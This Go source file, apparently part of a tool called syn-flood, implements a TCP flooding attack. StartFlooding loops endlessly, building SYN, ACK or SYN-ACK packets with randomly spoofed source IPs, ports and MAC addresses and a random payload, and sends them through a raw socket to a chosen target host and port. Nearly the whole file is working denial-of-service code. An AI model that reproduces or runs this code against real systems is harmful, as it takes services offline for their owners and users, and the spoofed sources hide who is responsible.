package raw

import (
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/bilalcaliskan/syn-flood/internal/logging"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/pkg/errors"
	progressbar "github.com/schollz/progressbar/v3"
	"go.uber.org/zap"
	"golang.org/x/net/ipv4"
)

var logger *zap.Logger

func init() {
	logger = logging.GetLogger()
	// initialize global pseudo random generator
	rand.Seed(time.Now().Unix())
}

// StartFlooding does the heavy lifting, starts the flood
func StartFlooding(stopChan chan bool, destinationHost string, destinationPort, payloadLength int, floodType string) error {
	var (
		ipHeader   *ipv4.Header
		packetConn net.PacketConn
		rawConn    *ipv4.RawConn
		err        error
	)

	destinationHost, err = resolveHost(destinationHost)
	if err != nil {
		return errors.Wrap(err, "unable to resolve host")
	}

	description := fmt.Sprintf("Flood is in progress, target=%s:%d, floodType=%s, payloadLength=%d",
		destinationHost, destinationPort, floodType, payloadLength)
	bar := progressbar.DefaultBytes(-1, description)

	payload := getRandomPayload(payloadLength)
	srcIps := getIps()
	srcPorts := getPorts()
	macAddrs := getMacAddrs()

	for {
		select {
		case <-stopChan:
			return nil
		default:
			tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], destinationPort, floodType)
			ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], destinationHost)
			if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
				return err
			}

			// Serialize.  Note:  we only serialize the TCP layer, because the
			// socket we get with net.ListenPacket wraps our data in IPv4 packets
			// already.  We do still need the IP layer to compute checksums
			// correctly, though.
			ipHeaderBuf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}

			if err = ipPacket.SerializeTo(ipHeaderBuf, opts); err != nil {
				return errors.Wrap(err, "unable to serialize")
			}

			if ipHeader, err = ipv4.ParseHeader(ipHeaderBuf.Bytes()); err != nil {
				return errors.Wrap(err, "unable to parse IP header")
			}

			ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
			tcpPayloadBuf := gopacket.NewSerializeBuffer()
			pyl := gopacket.Payload(payload)

			if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, pyl); err != nil {
				return errors.Wrap(err, "unable to serialize layers")
			}

			// XXX send packet
			if packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0"); err != nil {
				return errors.Wrap(err, "unable to listen packets on 0.0.0.0")
			}

			if rawConn, err = ipv4.NewRawConn(packetConn); err != nil {
				return errors.Wrap(err, "unable to create raw connection over 0.0.0.0")
			}

			if err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
				return err
			}

			if err = bar.Add(payloadLength); err != nil {
				return errors.Wrap(err, "unable to increase bar length")
			}
		}
	}
}

// buildIpPacket generates a layers.IPv4 and returns it with source IP address and destination IP address
func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
	return &layers.IPv4{
		SrcIP:    net.ParseIP(srcIpStr).To4(),
		DstIP:    net.ParseIP(dstIpStr).To4(),
		Version:  4,
		Protocol: layers.IPProtocolTCP,
	}
}

// buildTcpPacket generates a layers.TCP and returns it with source port and destination port
func buildTcpPacket(srcPort, dstPort int, floodType string) *layers.TCP {
	var isSyn, isAck bool
	switch floodType {
	case TypeSyn:
		isSyn = true
	case TypeAck:
		isAck = true
	case TypeSynAck:
		isSyn = true
		isAck = true
	}

	return &layers.TCP{
		SrcPort: layers.TCPPort(srcPort),
		DstPort: layers.TCPPort(dstPort),
		//Window:  1505,
		Window: 14600,
		// Urgent:  0,
		//Seq:     11050,
		Seq: 1105024978,
		// Ack:     0,
		SYN: isSyn,
		ACK: isAck,
	}
}

// buildEthernetPacket generates an layers.Ethernet and returns it with source MAC address and destination MAC address
func buildEthernetPacket(srcMac, dstMac []byte) *layers.Ethernet {
	return &layers.Ethernet{
		SrcMAC: net.HardwareAddr{srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]},
		DstMAC: net.HardwareAddr{dstMac[0], dstMac[1], dstMac[2], dstMac[3], dstMac[4], dstMac[5]},
	}
}
